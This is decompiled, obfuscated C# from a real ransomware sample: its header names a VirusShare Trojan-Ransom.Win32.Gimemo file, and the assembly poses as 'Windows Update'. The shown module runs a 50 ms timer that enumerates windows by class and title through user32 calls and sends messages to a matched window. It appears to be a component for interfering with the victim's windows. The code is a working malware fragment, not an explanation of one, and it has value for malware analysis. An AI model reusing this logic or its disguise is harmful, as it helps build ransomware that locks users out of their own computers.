// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Windows Update, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AD392BA1-9C14-4DFE-974F-DF263E483990
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00009-msil\Trojan-Ransom.Win32.Gimemo.wxj-0ca921544c9054361bc16e568e27aab3c46187149d7919afc9cfc91c5f59efb7.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class \u0008
{
  private static Timer \u0002 = new Timer();
  private static IntPtr \u0003;
  private static string \u0005;
  public static string \u0008;
  private static IntPtr \u0006 = IntPtr.Zero;

  [DllImport("user32", EntryPoint = "SendMessageA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0002(IntPtr _param0, int _param1, int _param2, int _param3);

  [DllImport("user32.dll", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0002([MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1);

  [DllImport("user32.dll", EntryPoint = "EnumChildWindows", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0002(IntPtr _param0, \u0008.\u0002 _param1, int _param2);

  [DllImport("user32.dll", EntryPoint = "GetClassNameA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern long \u0002(long _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, long _param2);

  [DllImport("user32", EntryPoint = "GetClassNameA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0002(IntPtr _param0, StringBuilder _param1, int _param2);

  [DllImport("user32", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0003(IntPtr _param0, StringBuilder _param1, int _param2);

  [DllImport("user32", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0002(IntPtr _param0);

  private static void \u0002(object _param0, EventArgs _param1)
  {
    if (\u0008.\u0006 == IntPtr.Zero)
    {
      string str1 = (string) null;
      ref string local1 = ref str1;
      string str2 = \u0002\u2000.\u0002(-1240717539);
      ref string local2 = ref str2;
      \u0008.\u0003 = (IntPtr) \u0008.\u0002(ref local1, ref local2);
      if (!(\u0008.\u0003 != (IntPtr) 0))
        return;
      \u0008.\u0002(\u0008.\u0003, new \u0008.\u0002(\u0008.\u0002), 0);
    }
    else
      \u0006.\u0002(\u0008.\u0003, \u0008.\u0006);
  }

  public static bool \u0002() => \u0008.\u0002.Enabled;

  public static void \u0002(bool _param0)
  {
    if (_param0)
    {
      \u0008.\u0008 = Process.GetCurrentProcess().ProcessName;
      if (\u0008.\u0002.Interval != 50)
      {
        Timer timer = \u0008.\u0002;
        \u0008.\u0002.Tick += new EventHandler(\u0008.\u0002);
        timer.Interval = 50;
        timer.Enabled = true;
        timer.Start();
      }
      else
      {
        \u0008.\u0002.Enabled = true;
        \u0008.\u0002.Start();
      }
    }
    else
    {
      \u0008.\u0002.Enabled = false;
      \u0008.\u0002.Stop();
      \u0008.\u0006 = IntPtr.Zero;
    }
  }

  private static int \u0002(IntPtr _param0, int _param1)
  {
    string str = \u0008.\u0002(_param0);
    string String1 = \u0008.\u0003(_param0);
    if (Strings.InStr(str.ToString(), \u0002\u2000.\u0002(-1240717342)) != 0 && Strings.InStr(String1, \u0002\u2000.\u0002(-1240717362)) != 0)
      \u0008.\u0006 = _param0;
    _param0.ToString() + \u0002\u2000.\u0002(-1240717346) + str + \u0002\u2000.\u0002(-1240717346) + String1;
    return 1;
  }

  private static string \u0002(IntPtr _param0)
  {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.Length = (int) byte.MaxValue;
    \u0008.\u0002(_param0, stringBuilder, stringBuilder.Length);
    return stringBuilder.ToString();
  }

  private static string \u0003(IntPtr _param0)
  {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.Length = checked (\u0008.\u0002(_param0) + 1);
    \u0008.\u0003(_param0, stringBuilder, stringBuilder.Length);
    return stringBuilder.ToString();
  }

  private delegate int \u0002(IntPtr _param1, int _param2);
}
